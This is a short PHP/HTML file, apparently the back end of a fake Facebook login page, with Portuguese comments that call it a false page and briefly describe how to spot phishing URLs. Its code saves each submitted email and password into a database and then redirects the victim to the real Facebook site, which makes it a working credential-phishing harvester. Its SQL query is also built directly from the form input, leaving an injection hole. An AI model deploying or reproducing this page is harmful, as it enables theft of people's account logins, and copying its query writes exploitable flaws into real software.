<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
</head>
<body>
<?php

//Essa é uma pagina falsa               

//Ao clicar no botão será direcionado na pagina oficial no Facebook.

//A senha e o email enviado no banco de dados.

//A melhor alternativa para descobrir se é o site verdadeiro, é olhando a URL do site oficial, 

//muitas vezes, os URLs de phishing contêm erros de ortografia, o que é um sinal comum de phishing 


include('conexao.php');


$email = $_POST['email'];
$senha = $_POST['senha'];



$sql = "INSERT INTO "." login(email,senha)"." VALUES ('$email','$senha')";
mysqli_query($conexao,$sql)

or die("A inclusão falhou: ". mysqli_error($conexao)."<br>SQL:". $sql);
            
 mysqli_close($conexao);
?>

    <script>
let a = window.location.replace("https://www.facebook.com/");
console.log(a);

    </script>

</body>
</html>


